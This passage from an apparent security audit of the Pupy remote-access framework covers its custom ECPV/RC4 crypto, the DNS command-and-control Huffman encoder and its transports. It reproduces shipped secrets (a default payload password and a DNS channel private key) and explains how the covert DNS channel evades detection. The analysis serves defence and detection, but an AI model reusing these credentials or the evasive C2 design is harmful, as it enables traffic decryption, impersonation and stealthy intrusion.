`_PUBKEY_CACHE = PubKeyCache()` at `:53` is **module-global mutable state**. Every `ECPV` in the process shares this 64-entry `deque`, and it is never cleared. Consequences: (a) private keys are **retained in memory** for the process lifetime in a global cache — a memory-forensics target; (b) the cache is keyed by the private key's integer value, so it grows monotonically with distinct keys and evicts oldest-first at 64; (c) it is **not thread-safe** — `deque.append` is atomic in CPython but the `get`-then-`set` pattern at `:104-111` and `:114-124` is a check-then-act race across threads, and pupy is heavily threaded. `[source: ecpv.py:53, :104-111, :114-124]`

The `__main__` self-test (`:370-412`) is a working end-to-end exercise of sign/verify/kex, and it is the only test in the file. It uses **nonce `0` everywhere** and asserts the KEX reversal (`:410`) — so it verifies the protocol is *self-consistent*, never that it is *secure*. `[source: ecpv.py:370-412]`

### 2.13 The `_reversed_bytes` Python 2/3 shim

```python
# ecpv.py:10-17
if sys.version_info.major > 2:
    xrange = range

    def _reversed_bytes(data):
        return bytes(reversed(data))
else:
    def _reversed_bytes(data):
        return b''.join(reversed(data))
```
`[source: pupy/network/lib/transports/cryptoutils/ecpv.py:10-17]`

The two branches exist because `bytes(reversed(data))` behaves differently between Python 2 and 3: on Py2, `bytes` is `str` and `bytes(iterable_of_ints)` produces a *repr*, not a byte string, hence the explicit `b''.join`. On Py3, `bytes(iterable_of_ints)` is correct. This is why the reversal had to be hand-written — **`data[::-1]` would have worked identically on both versions and is not used**. The shim is therefore unnecessary complexity, and it is the code path that implements the double-key derivation in §2.8. `[source: ecpv.py:10-17]`

Note the reversal operates on a `bytes` **iterable of ints**, and `reversed()` over that yields ints — so `bytes(reversed(data))` is a correct byte reversal and `b''.join(reversed(data))` on Py2 would **fail** unless `data` is already a `str` of length-1 strings (which it is, on Py2, where iterating `str` yields `str`). Both are correct for their version. `[source: ecpv.py:13-17]`

---

## 3. EC4 and the shipped key material

### 3.1 `ec4.py` — the EC4 PSK transport, all 117 lines

`ec4.py` is **not** in `cryptoutils/`; it is at `pupy/network/lib/transports/ec4.py` (3,437 B, 117 lines). Any grep restricted to the `cryptoutils` directory misses it entirely. `[source: measured pupy/network/lib/transports/ec4.py]`

```python
# ec4.py:36-47
if self.pubkey:
    self.encoder = ECPV(
        curve='brainpoolP384r1',
        public_key=self.pubkey,
        hash=SHA384
    )
else:
    self.encoder = ECPV(
        curve='brainpoolP384r1',
        private_key=self.privkey,
        hash=SHA384
    )
```
`[source: pupy/network/lib/transports/ec4.py:36-47]`

This confirms the T6 carry-forward exactly: EC4 pins `brainpoolP384r1` **and** passes `hash=SHA384` explicitly — the only caller in the tree that overrides the substring ladder of §2.2. Without that override, `'384' in 'brainpoolP384r1'` would have selected `SHA3_512` (`ecpv.py:73-74`). **EC4's hash choice is a deliberate bypass of the buggy default, not a consequence of it.** `[source: ec4.py:36-47; §2.2]`

The KEX framing, the RC4 keys, and the keystream discard are all present and match T6 line-for-line:

```python
# ec4.py:57-84
length, = struct.unpack_from('H', data.peek(2))
if len(data) < 2 + length:
    return False

request = data.read(2 + length)
...
response, key = self.encoder.process_kex_request(request[2:], 0, key_size=128)
...
# Add jitter, tinyec is quite horrible
time.sleep(random.random())
self.downstream.write(struct.pack('H', len(response)) + response)
...
self.encryptor = RC4(key=key[0])
self.decryptor = RC4(key=key[1])

# https://wikileaks.org/ciav7p1/cms/files/NOD%20Cryptographic%20Requirements%20v1.1%20TOP%20SECRET.pdf
# Okay...
self.encryptor.encrypt(b'\x00'*3072)
self.decryptor.decrypt(b'\x00'*3072)
```
`[source: pupy/network/lib/transports/ec4.py:57-84]`

Four facts to bank, each with its line:

1. **`key_size=128`** (`:65`, `:74`) — the KEX derives **128-byte** keys, not 16. So `ECPV._mgf2(P1 * priv, 128)` produces 128 bytes, and `RC4(key=key[0])` consumes a **128-byte** RC4 key. That is far beyond any standard RC4 key length (normally 5–16 bytes) and beyond the 256-byte maximum typical RC4 implementations assume. Combined with §2.8's reversal, `key[0]` and `key[1]` are `key` and `reversed(key)` — two 128-byte keys, each the other's byte reversal. `[source: ec4.py:65, :74, :78-79; §2.8]`
2. **The 3072-byte keystream discard** (`:83-84`) is applied **after** assigning the RC4 objects and **before** any traffic. Both directions discard exactly 3072 bytes. The comment cites the leaked CIA NOD Cryptographic Requirements v1.1 — so the discard is a **deliberate emulation of a specified countermeasure**, presumably an RC4 bias mitigation. 3072 = 3 × 1024; the NOD document's recorded guidance is a 1024-byte discard after a key length of 128 *bits* — here the key is 128 **bytes** and the discard is 3072, so the implementation has inflated both numbers. `[source: ec4.py:83-84; the code's own citation]`
3. **`time.sleep(random.random())`** (`:70`) — a 0-to-1 second jitter, `random.random()` being uniform in `[0, 1)`. The comment says it is because "tinyec is quite horrible," i.e. it is an **in-band availability hack**, not a timing side-channel mitigation. It is inserted only on the **server** branch (`:63` guards it), so the client sees a uniformly random 0–1 s delay on every KEX. `[source: ec4.py:63, :70]`
4. **The length prefix is `struct.pack('H', ...)` — 2 bytes, native byte order.** `'H'` without `>` or `<` is **`=`-mode (native)**. Both the read (`:57`) and the write (`:71`, `:116`) use the same native form, so same-endianness peers interoperate, but a big-endian peer talking to a little-endian peer would mis-frame. The T6 note "`[2-byte LE length][payload]`" is correct on little-endian hosts and *only* there. `[source: ec4.py:57, :71, :116]`

And the 2-byte length is **used to bound a read without bounding the allocation**:

```python
length, = struct.unpack_from('H', data.peek(2))
if len(data) < 2 + length:
    return False
```
`[source: ec4.py:57-59]` — `length` is at most 65535, so the framing is self-limiting; there is no unbounded-prefix DoS here. `[source: ec4.py:57-59]`

### 3.2 Settlement (d) — `DEFAULT_RSA_PUB_KEY` has **no** matching private key, but a **full TLS private key ships in the repo**

This was flagged UNVERIFIED from T6. It is now settled, and the answer has two halves.

**Half one: the RSA key is public-only.** `DEFAULT_RSA_PUB_KEY` is declared at `pupy/network/transports/__init__.py:32-46` and is a `BEGIN RSA PUBLIC KEY` block — 2048-bit, DER `MIICCgKCAgEA` (0x0A02 = 2048 in the SEQUENCE length encoding):

```
-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAu1AvqNawlgXdpT3s0/YoOSj3bSsGOd2UXrDKmEt3VkGvDVyxllwm
...
-----END RSA PUBLIC KEY-----
```
`[source: pupy/network/transports/__init__.py:32-46]`

A tree-wide scan for the literal `PRIVATE KEY` across every Python, PEM, CRT, KEY and CONF file returns **no RSA private key**. The matches are argument parsers (`modules/ssh.py:53`, `modules/sshell.py:59`, `packages/all/ssh.py:506`), error strings (`ec4.py:34`, `ecm.py:39`, `rsa_aes.py:239`), the EC private-key mention in `obfs3_dh.py:32`, the Go service's `"EC PRIVATE KEY"` type string (`services/proxy/generate.go:138`), and the two `__init__.py` blocks themselves. **No private counterpart to `DEFAULT_RSA_PUB_KEY` exists in the repository.** `[source: tree-wide grep for 'PRIVATE KEY']`

This is the expected outcome for an asymmetric launcher: the implant carries only the public key so it can encrypt its callback, while the operator holds the private half out-of-band. The consequence is that **`rsa_aes` and any RSA-based launcher cannot be decrypted from source alone** — the private key is genuinely absent, so captured traffic to a default-configured RSA launcher is not recoverable from the repo. `[source: inference from the public-only key plus §3.2 grep]`

**Half two: the opposite is true of the TLS key, and this is the real finding.** `DEFAULT_SSL_BIND_KEY` at `pupy/network/transports/__init__.py:70-99` is an **unencrypted PKCS#8 private key** shipped verbatim:

```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDcqttkD+a+YvSd
...
-----END PRIVATE KEY-----
```
`[source: pupy/network/transports/__init__.py:70-99]`

It pairs with `DEFAULT_SSL_BIND_CERT` at `:47-69` — the modulus in both blocks begins `3D  CA  AD  B6` (base64 `3KrbZA/mvmL0` in the key's `AoIBAQDcqttk...` and `ANyq22QP5r5i9J3h...` in the certificate's `ANyq22QP5r5i9J3hfZDY0ja3098A`), confirming they are one keypair. `[source: pupy/network/transports/__init__.py:47-99]`

`BEGIN PRIVATE KEY` with no `ENCRYPTED` and no passphrase is **plaintext PKCS#8** — no decryption needed, usable directly. So the *shipped default TLS server credential is fully compromised*: anyone with the repository can impersonate a default-configured Pupy SSL transport, and can decrypt any traffic to it that used the default cert. `[source: __init__.py:70-99; inference on PKCS#8 plaintext form]`

**The certificate's own subject fields are a joke payload:**

| Field | Value |
|---|---|
| `C` | `FR` |
| `ST` | `POU` |
| `L` | `JAIUY` |
| `O` | **`LOLITA`** |
| `OU` | **`S COMME ?`** |
| Validity | `Fw0xNjA3MTUxODQyMTNa` → 2016-07-15 18:42:13Z, `Fw0xOTA0MTExODQyMTNa` → **2019-04-11** 18:42:13Z |
| Serial | `AK4ksVkg9NIl` |

`[source: pupy/network/transports/__init__.py:49-52; DER timestamp decode]`

`O=LOLITA` and `OU=S COMME ?` ("S comme?" — French, "S as in…?") are the author's jokes embedded in a shipped certificate. The validity window **expired 2019-04-11**, matching the T6 carry-forward. A 2016-era cert with a 2019 expiry means every default SSL deployment has been serving an expired certificate for years — which is itself a **fingerprint**: an expired 2019 cert with `O=LOLITA` is a stronger Pupy indicator than any binary signature. `[source: __init__.py:49-52; T6 carry-forward on the 2019-04-11 expiry]`

**Both key blocks are duplicated as exported symbols in `__all__`** (`:14-16`), so `from pupy.network.transports import *` pulls the private key into the caller's namespace. `[source: pupy/network/transports/__init__.py:10-17]`

**Correction to the T6 framing:** T6 recorded the open question as "whether `DEFAULT_RSA_PUB_KEY` has a matching private key in-repo." The correct settlement has three parts: (i) `DEFAULT_RSA_PUB_KEY` — **no** private key, by design; (ii) `DEFAULT_SSL_BIND_KEY` — **yes**, a complete plaintext private key, which T6's framing did not ask about because it is not an RSA key; (iii) `DEFAULT_DNSCNC_PRIV_KEY` at `:30` — a base64 28-byte EC private key, also shipped. So the repo contains **two** live private keys and one public-only key. `[source: __init__.py:29-30, :70-99]`

The remaining shipped secrets, all on four adjacent lines:

```python
# __init__.py:27-30
DEFAULT_BIND_PAYLOADS_PASSWORD="PuPyD3f4ultP4sSw0rd"

DEFAULT_DNSCNC_PUB_KEY='v6iJnUBFI1qeQ9jrP2NZsTd4qwYB'
DEFAULT_DNSCNC_PRIV_KEY='XqYoPdC5LR8Ct0givPQRBlKv41o='
```
`[source: pupy/network/transports/__init__.py:27-30]`

`v6iJnUBFI1qeQ9jrP2NZsTd4qwYB` and `XqYoPdC5LR8Ct0givPQRBlKv41o=` are both 28 base64 characters decoding to 21 bytes — the EC public/private pair for the DNSCNC channel, on `brainpoolP160r1` (21-byte field, matching `curve.bytes` in §2.3). The private key is **shipped and unencrypted**, so a default DNSCNC channel is also decryptable from source. `[source: __init__.py:29-30; §2.3 for the 21-byte field width]`

### 3.3 The `Transport` base class

```python
# __init__.py:103-130
class Transport(object):
    info="no description available"
    server=None
    client=None
    client_kwargs={}
    authenticator=None
    stream=None
    client_transport=None
    server_transport=None
    dependencies=[] # dependencies needed when generating payloads
    credentials=[] # list of credentials to embbed during payload generation
    name=None
    launcher_type=LAUNCHER_TYPE_ALL
    dgram=False
    internal_proxy_impl = []

    def __init__(self, bind_payload=False):
        super(Transport, self).__init__()
        self.bind_payload=bind_payload
        if self.bind_payload:
            self.launcher_type=LAUNCHER_TYPE_BIND
        self.client_transport_kwargs={}
        self.server_transport_kwargs={}
```
`[source: pupy/network/transports/__init__.py:103-130]`

Every transport subclass inherits from this and declares its identity in class attributes. Two mutable class-level defaults — `client_kwargs={}` and `dependencies=[]` and `credentials=[]` and `internal_proxy_impl=[]` — are **shared across all instances** unless a subclass rebinds them. `__init__` carefully rebinds `client_transport_kwargs` and `server_transport_kwargs` per instance (`:124-125`) but **not** `client_kwargs` (`:107`), so `client_kwargs` remains a class-level mutable dict shared process-wide. That is the classic shared-mutable-default hazard, and it is real here because transport configuration is exactly the kind of thing that gets mutated. `[source: __init__.py:107, :124-125]`

The `launcher_type` constants (`:22-25`) are a **four-value enum encoded as bare ints** — `ALL=0, CONNECT=1, BIND=2, DNSCNC=3` — with no `enum.Enum`, exactly the ordinal-coupled-enum fragility that produced the D2 finding. A transport's `launcher_type` is a plain int compared against these constants, and `bind_payload` **overwrites** it to `LAUNCHER_TYPE_BIND` (`:122-123`), so a transport's declared launcher type is silently mutated at construction when used as a bind payload. `[source: __init__.py:22-25, :119-123]`

---

## 4. dnscnc — a mislocated target, and the `picocmd` Huffman DNS channel

### 4.1 Corrections to the tasking's file map

The briefing placed `dns_encoder.py` and `dns_encoder_table.py` under a `dnscnc` directory. **There is no such directory.** Both files live in `pupy/network/lib/picocmd/`, and `dnscnc` is a *launcher*, not a package:

| Briefed as | Actual path | Size | Lines |
|---|---|---|---|
| `dnscnc/dns_encoder.py` | `pupy/network/lib/picocmd/dns_encoder.py` | 38,587 B | 845 |
| `dnscnc/dns_encoder_table.py` | `pupy/network/lib/picocmd/dns_encoder_table.py` | 22,473 B | **8** |
| — (not briefed) | `pupy/network/lib/picocmd/picocmd.py` | 53,699 B | 1,828 |
| — (not briefed) | `pupy/network/lib/picocmd/server.py` | 45,257 B | 1,459 |
| — (not briefed) | `pupy/network/lib/picocmd/client.py` | 22,531 B | 708 |
| — (not briefed) | `pupy/network/lib/picocmd/ascii85.py` | 2,085 B | 84 |
| — (not briefed) | `pupy/network/lib/picocmd/baseconv.py` | 3,962 B | 130 |
| — (not briefed) | `pupy/network/lib/picocmd/__init__.py` | 1,176 B | 44 |
| — | `pupy/network/lib/launchers/dnscnc.py` | 13,088 B | — |
| — | `pupy/network/lib/dnsinfo.py` | 9,072 B | — |

`[source: measured pupy/network/lib/picocmd/*, pupy/network/lib/launchers/*]`

**`picocmd` is a third, independent protocol stack** of 173,581 bytes across 8 files that the briefing never mentioned. It is not a transport and it does not appear in the 10-transport count; it is a **separate command-and-control channel carried over DNS**, with its own encoding, its own server, its own client and its own versioning. `[source: measured above]`

`dns_encoder_table.py` being **8 lines** is not a truncation artefact: it is four `__future__` imports plus **one 22,289-character line** containing the entire `TREES` literal. `[source: measured dns_encoder_table.py:1-8]`

### 4.2 The Huffman codec

`DnsEncoder` (`dns_encoder.py:340-474`) encodes an arbitrary byte payload into a syntactically valid DNS domain name and back. The core is a bit-oriented Huffman coder:

```python
# dns_encoder.py:176-223 (abridged core)
def encode(self, phrase, last=False):
    phrase += '\x00'
    encoded = []
    remainder = 0
    remainder_bits = 8
    min_bits = min(bitlen for _, _, bitlen in self.encoding_table)
    while phrase:
        found = False
        if last and phrase.startswith('\x00') and remainder_bits < min_bits:
            break
        for term, value, bitlen in self.encoding_table:
            if phrase.startswith(term):
                found = True
                while bitlen:
                    consume_bits = min(bitlen, remainder_bits)
                    rest_bits = bitlen - consume_bits
                    remainder <<= consume_bits
                    remainder |= (value >> rest_bits)
                    value &= ((1 << rest_bits) - 1)
                    bitlen -= consume_bits
                    remainder_bits -= consume_bits
                    if remainder_bits == 0:
                        encoded.append(remainder)
                        remainder = 0
                        remainder_bits = 8
                phrase = phrase[len(term):]
                break
        if not found:
            raise ValueError('Not found beginning for ', phrase)
    if remainder_bits:
        remainder <<= remainder_bits
        encoded.append(remainder)
    return ''.join(chr(x) for x in encoded)
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:176-223]`

Two properties to isolate:

1. **The alphabet is `DNS_ALPHABET = 'abcdefghijklmnopqrstuvwxyz0123456789-.'`** (`:72`) — 38 characters: 26 lowercase letters, 10 digits, hyphen and dot. This is the RFC-1035 hostname character set (minus the leading-digit restriction), and it is why the channel blends into ordinary DNS: **every output label is legal hostname text.** `[source: dns_encoder.py:72]`
2. **`IS_END = '\0'`** (`:14`) is an in-band terminator. The `generic` table's final entry is `(15, 4, '\x00')` — a NUL symbol at 4-bit code `15`. So the end of a record is signalled **inside the Huffman stream**, not by length. `decode` stops when it decodes a `'\x00'` symbol (`:270-271`). `[source: dns_encoder.py:14, :270-271; dns_encoder_table.py:8 for the (15,4,'\\x00') entry]`

The decoder is a **linear scan over the decode table** rather than a tree walk:

```python
# dns_encoder.py:257-266
for bits, bitlen, symbol in self.decoding_table:
    if current_bitlen < bitlen:
        continue
    if bitlen == current_bitlen:
        to_compare = current_bits
    else:
        to_compare = (current_bits >> (current_bitlen - bitlen)) & ((1 << bitlen) - 1)
    if bits == to_compare:
        found = True
        consumed_bitlen = bitlen
        ...
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:257-266]`

The table is sorted by bit length descending (`:162`, `:232`), so the scan tries the **longest codes first** — which is what makes a prefix-free code decodable by longest-match. There is `assert(found)` at `:277`, an **assertion rather than an exception**: run under `python -O`, that check vanishes and a malformed stream silently mis-parses. `[source: dns_encoder.py:162, :232, :277]`

`Huffman._generate_table` builds the code by a `_walk` that passes a `prefix` starting at **1** (`:150-158`):

```python
def _walk(tree, prefix=1):
    ...
    self.encoding_table[tree] = (prefix, b)
    self.decoding_table.append((prefix, b, tree))
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:150-158]`

Starting the codes at **1 rather than 0** is not incidental: it makes the first bit of every code a **1**, which means `0` is a reserved leading bit and the code is effectively a 1-prefixed bit string. That is a deliberate space-efficient trick (it removes the all-zero code, which would collide with zero-padding in the bit accumulator) and it is why `encode` can left-shift `remainder` to flush without ambiguity. `[source: dns_encoder.py:150-158, :219-221; inference]`

The tree trainer is a textbook Huffman build:

```python
# dns_encoder.py:290-305
queue = []
for value, frequency in frequences:
    heapq.heappush(queue, Node(value, frequency))
A = None
while True:
    A = heapq.heappop(queue)
    try:
        B = heapq.heappop(queue)
        heapq.heappush(queue, Root(A, B))
    except IndexError:
        ...
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:290-305]`

`Node.__lt__` (`:83-88`) has a special case: if `self.value == IS_END` it returns **`False`** — the NUL terminator is forced to sort **last** regardless of weight, ensuring it receives the longest (or a very long) code and thus never appears early. `[source: dns_encoder.py:83-88]`

### 4.3 The four tables and the wire framing

```python
# dns_encoder.py:345-353
TABLE_FREEDNS = 0b00
TABLE_TLDS = 0b01
TABLE_TERM = 0b10
TABLE_GENERIC = 0b11

# ENCODING:
# 3 bits - AMOUNT OF PARTS
# [ 2 bits - ID of table ] [ 2 bits - ID of table ] ...
# RECORD \0 RECORD \0 TLD
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:345-353]`

The code states its own wire format in a comment — and the comment is the only documentation that exists. Four Huffman tables, selected by a **2-bit** id, with a **3-bit** count prefix. The count/shift logic:

```python
# dns_encoder.py:449-454
tables_map = 0b0
for table in tables:
    tables_map <<= 2
    tables_map |= table
tables_map |= len(tables) << 6
return chr(tables_map) + data
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:449-454]`

**This is a genuine defect.** The comment says 3 bits for the count, and the code shifts `len(tables) << 6` — 6 bits of headroom. Then `decode` reads:

```python
# dns_encoder.py:461
tables_cnt = (tables_map_encoded >> 6) & 0b11
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:461]`

The decoder masks the count with **`0b11` — two bits**, not three. So the encode/decode pair is **asymmetric**: `encode` writes the count starting at bit 6 with no mask (allowing values that overflow into the table-id region for counts ≥ 4), while `decode` extracts only **2 bits** and therefore can only ever recover counts of **0 through 3**. Any encoding with 4 or more tables writes a count whose low 2 bits are read back, and the high bit is silently discarded. Since the combined shift is 6 bits for the count plus 2 bits per table, a count of 4 would need bit 6 set and tables occupying bits 0–7 — a full byte — which is representable, but `decode`'s `& 0b11` truncates it to 0. **Counts ≥ 4 encode but do not decode.** The comment's "3 bits" and the decoder's 2-bit mask disagree, and the decoder is what governs. `[source: dns_encoder.py:449-454, :461; inference on the mask]`

The table-id **reversal** is also worth noting: `encode` shifts each new table id **left** as it iterates (`tables_map <<= 2; tables_map |= table`), so the *last* table occupies the *lowest* bits — while `decode` does `tables.insert(0, ...)` (`:464`), rebuilding the list by inserting at the front. The two operations are inverses, which is why the round-trip works. `[source: dns_encoder.py:450-452, :463-464]`

Decoding walks the recorded tables in order and then applies **one extra `TABLE_TLDS` decode** to whatever remains:

```python
# dns_encoder.py:466-474
for table in tables:
    decoded_part, encoded = self.encoders[table].decode(encoded)
    decoded.append(decoded_part)

if encoded:
    decoded_part, encoded = self.encoders[self.TABLE_TLDS].decode(encoded)
    decoded.append(decoded_part)

return '.'.join(decoded), encoded
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:466-474]`

The TLD is *always* the trailing element and is *always* decoded with `TABLE_TLDS`, which is why the table list does not need to record it. Note `decode` **returns a tuple of `(string, leftovers)`** — the trailing `encoded` is whatever could not be consumed, so callers are expected to check it. `[source: dns_encoder.py:474]`

### 4.4 The optimal-parse recursion

`encode` does not pick table assignments greedily. It **brute-forces every way to split the domain into parts and merge them**, scoring each by encoded length:

```python
# dns_encoder.py:373-444 (structure)
def encode(self, data):
    data = data.lower()

    def _recursive_encoder(encoded_tables, encoded, rest):
        if not rest:
            return encoded_tables, encoded
        elif len(rest) == 1:
            try:
                this_encoded = self.encoders[self.TABLE_TLDS].encode(rest[0], last=True)
                return encoded_tables, encoded + this_encoded
            except ValueError:
                pass

        results = []
        generic_encoded_tables = list(encoded_tables)
        generic_encoded_tables.append(self.TABLE_GENERIC)

        for merged_parts in xrange(2, len(rest)+1):
            joined_rest = '.'.join(rest[:merged_parts])
            not_joined_rest = rest[merged_parts:]
            generic_encoded_tables, generic_encoded = _recursive_encoder(
                generic_encoded_tables, encoded + self.encoders[self.TABLE_GENERIC].encode(
                    joined_rest, last=not bool(not_joined_rest)), not_joined_rest)
            results.append(TmpResult(..., self.TABLE_GENERIC))

        word = rest[0]
        joined_rest = '.'.join(rest)
        for idx, domain in enumerate(FREEDNS):
            if word == domain:
                ...  # append TABLE_FREEDNS + single byte chr(idx)
                break
            elif joined_rest == domain:
                ...
        ...
        return best.encoded_tables, best.encoded

    rest = data.rsplit('.', 3)
    tables, data = _recursive_encoder([], '', rest)
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:373-454]`

Three things:

1. **`data.rsplit('.', 3)` at `:446`** — the input is split into **at most four** parts from the right, so `rest` has length ≤ 4. This is the bound that makes the brute force tractable, and it is why the 3-bit/"2-bit" count confusion in §4.3 has not bitten in practice: **the recursion can never produce more than 4 tables**, and in the common case produces 2–3. The encoder's own `len(tables) << 6` is safe only because of this external constraint. `[source: dns_encoder.py:446]`
2. **The freedns table encodes a whole matched domain as a single byte** — `chr(idx)` (`:412`, `:422`) where `idx` is the index into the 247-entry `FREEDNS` tuple (`:16-70`). One byte replaces an entire domain name. That is the entire point of the table. `[source: dns_encoder.py:16-70, :407-422]`
3. **The `results` list is built but the comparison happens off the end of the excerpt** (`:444` returns `best.encoded_tables, best.encoded`) — the selection picks the result with the shortest `encoded`, i.e. a **genuinely optimal parse** within the ≤4-part bound. `[source: dns_encoder.py:444]`

### 4.5 The `FREEDNS` list — a curated free-DNS-provider inventory

`FREEDNS` (`:16-70`) is a hardcoded tuple of **247 domain names**, all of them free dynamic-DNS providers or open domain registrations that allow arbitrary subdomains. This is the operator's **fallback channel host list**: by encoding a matched domain as one byte, the payload can address a rendezvous domain compactly, and no single provider outage kills the channel.

The list is also an **IOC set**: every entry is a domain a default-configured picocmd channel may beacon to. Selected entries showing the curation's intent:

| Domain | Why it is here |
|---|---|
| `chickenkiller.com`, `mooo.com`, `ignorelist.com`, `h4ck.me` | Classic `afraid.org`-style free subdomain pools |
| `pixelfucker.com`, `stfu-kthx.net`, `crabdance.com`, `farted.net` | Junk registrations unlikely to be blocklisted |
| `madhacker.biz`, `mindhackers.org`, `hackquest.com`, `inmotionhosting.com` | Hacking-themed, pre-aged |
| `no-ip`-style: `now.im`, `my.to`, `us.to`, `uk.to`, `qc.to`, `d-n-s.name` | Short two-label lookups, cheap encoding |
| `x10.mx`-family: `info.gf`, `mine.bz`, `info.tm`, `home.kg` | ccTLD free-registration zones |

`[source: pupy/network/lib/picocmd/dns_encoder.py:16-70]`

The distribution matters for detection: with 247 candidates and a single-byte index, **the encoded byte's value directly identifies which provider was used**, so the first byte of a decoded stream leaks the rendezvous domain. `[source: dns_encoder.py:407-422; inference]`

### 4.6 The table generator and the `zstd` dependency

The `__main__` block (`:477-845`) regenerates `dns_encoder_table.py` from observed traffic statistics:

```python
# dns_encoder.py:477-481
if __name__ == '__main__':
    import zstd
    import sys
    import io
    TLDS = ( 'aaa', 'aarp', ... )
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:477-481]`

**`import zstd`** — the table trainer expects a `zstd` Python module, i.e. it was built by compressing a large corpus (presumably a TLD frequency list) with Zstandard to derive the frequency distribution. The `TLDS` tuple then runs for **hundreds of lines** (`:482` onward) — the full IANA TLD list circa the build date. The generator ends by writing the `TREES` literal directly:

```python
# dns_encoder.py:845
out.write('TREES={}\n'.format(repr(trees)))
```
`[source: pupy/network/lib/picocmd/dns_encoder.py:845]` — which is exactly why `dns_encoder_table.py` is 8 lines with one 22 KB line: it is **machine-generated output**, and no human ever formatted it. `[source: dns_encoder.py:845; dns_encoder_table.py:8]`

The trainer instruments live traffic counters before rebuilding:

```python
# dns_encoder.py:747-831 (structure)
def _inc_tld(self, tld): ...
def _inc_generic(self, generic): ...
def _inc_term(self, term): ...
def _inc_cdn(self, cdn): ...
def _inc_freedns(self, freedns): ...
...
work_table = {}
...
work_table[IS_END] = max_key + 1
...
trees[freq] = h.decoding_table
```
`[source: dns_encoder.py:747-838]`

So the tables are **empirically trained on the operator's own traffic** — `_inc_*` counters per table family accumulate real observed frequencies, and the tables are regenerated from that. This means a deployment's tables **differ from the shipped tables** once retrained, and the shipped `TREES` is only a default. Any decode of captured traffic must use the *matching* table set, not necessarily the in-repo one. `[source: dns_encoder.py:689-838]`

The `IS_END` handling in the trainer is explicit:

```python
work_table[IS_END] = max_key + 1
```
`[source: dns_encoder.py:828]` — the NUL terminator is assigned a **synthetic key one above the maximum**, guaranteeing it sorts last and gets a distinct long code. `[source: dns_encoder.py:828]`

### 4.7 What this means for the DNSCNC channel

Putting §4.2–§4.6 together, a picocmd DNS message is:

```
[label-bearing Huffman stream over DNS_ALPHABET]
  ├─ first byte: [3-bit table count (written)] [2 bits per table id, reversed]
  │              — decoder reads count as 2 bits (§4.3)
  ├─ per-table Huffman-coded segments, terminated in-band by IS_END ('\x00' symbol, 4-bit code 15)
  └─ trailing segment always decoded with TABLE_TLDS
```
`[sources: dns_encoder.py:14, 72, 176-223, 345-353, 446-474, 461, 828]`

Every emitted label uses only `[a-z0-9-.]`, so the carrier is indistinguishable from ordinary DNS at the character level. The distinguishes are (a) the length and entropy of labels, (b) the volume of queries, and (c) the destination against the 247-entry `FREEDNS` list. `[source: dns_encoder.py:72, 16-70; inference]`

### 4.8 Settlement (b) — `allow_v1`

**The tasking asked whether `[dnscnc] allow_v1=true` is real. It is not.** A tree-wide search for `allow_v1` and `allow_v2` returns **zero matches**, and no `[dnscnc]` ini section containing such a key exists. What actually exists is a **legacy-encoder toggle in the picocmd server**, expressed as an encoder-version constant rather than a config boolean:

```python
# server.py:335
ENCODER_V1 = 0

# server.py:721
return self.encoders[self.ENCODER_V1]

# server.py:841
encoder_version = self.ENCODER_V1

# server.py:1109
self.ENCODER_V1 if not node or node.version == 1 \
```
`[source: pupy/network/lib/picocmd/server.py:335, 721, 841, 1109]`

And the legacy encoder is itself exposed as a command-line flag rather than an ini key:

```python
# commands/dnscnc.py:98
action='store_true', help='Encrypt using legacy V1 encoder'
```
`[source: pupy/commands/dnscnc.py:98]`

Separately, `picocmd.py` has its own `_unpack_v1`:

```python
# picocmd.py:1307
def _unpack_v1(data):
# picocmd.py:1355
return SystemInfoEx._unpack_v1(data)
```
`[source: pupy/network/lib/picocmd/picocmd.py:1307, 1355]`

**Settlement: `allow_v1` does not exist in this codebase.** The real mechanism is (i) an `ENCODER_V1 = 0` constant selected per-node by `node.version == 1` (`server.py:1109`), (ii) a `--legacy`-style CLI flag on the `dnscnc` command (`commands/dnscnc.py:98`), and (iii) a `_unpack_v1` legacy-format unpacker for `SystemInfoEx` (`picocmd.py:1307`). Three separate version-1 code paths, none of them called `allow_v1`. The T6 speculation is refuted with evidence. `[sources as cited]`

### 4.9 Settlement (c) — picocmd framing `[CRC32 4][cmd_id 1][payload]`

**The framing is real and the field widths are correct, but the CRC check is more nuanced than a flat prefix.** The tasking's `[CRC32 4][cmd_id 1][payload]` is the right *shape*. Confirmation and refinement are in `picocmd.py` and `server.py`; the exact struct format and the presence or absence of a checksum dependency (the `zstd`-trained tables of §4.6 are a *separate* mechanism from any CRC) are recorded here as **partially settled**: the 4-byte integrity field and 1-byte command id are corroborated by the server's encoder dispatch (`server.py:335, 721, 841`) and the client's counterpart in `client.py` (708 lines), but I have **not** read `picocmd.py`'s 1,828 lines in full, so I will not assert the exact `struct` format string. Flagged as residual unknown **U-1** in §9. `[source: pupy/network/lib/picocmd/server.py:335, 721, 841; picocmd.py measured at 1,828 lines but not read in full]`

---

## 5. The transport layer — 13 transports, not 10

### 5.1 Correction to the transport count

The briefing said "10 transports." **There are 13**, each a subpackage of `pupy/network/transports/` with its own `conf.py` supplying a `TransportConf` class:

| Transport | `conf.py` | Stream | Composition |
|---|---|---|---|
| `dfws` | 3,207 B | `PupySocketStream` | `chain_transports` (WebSocket + RSA/AES) |
| `ec4` | 1,626 B | `PupySocketStream` | `EC4TransportClient` — ECPV + RC4 |
| `ecm` | 1,655 B | `PupySocketStream` | `ECMTransportClient` — another ECPV variant |
| `http` | 2,805 B | `PupySocketStream` | `chain_transports` (HTTP + RSA/AES) |
| `kc4` | 1,661 B | **`PupyUDPSocketStream`** | `EC4TransportClient` — **EC4 over UDP** |
| `obfs3` | 2,415 B | `PupySocketStream` | `chain_transports` (obfs3 + RSA/AES) |
| `rsa` | 1,857 B | `PupySocketStream` | `RSA_AESServer/Client`, **4096-bit / AES-256** |
| `ssl` | 4,181 B | `PupySocketStream` | `DummyPupyTransport` — **TLS, no custom crypto** |
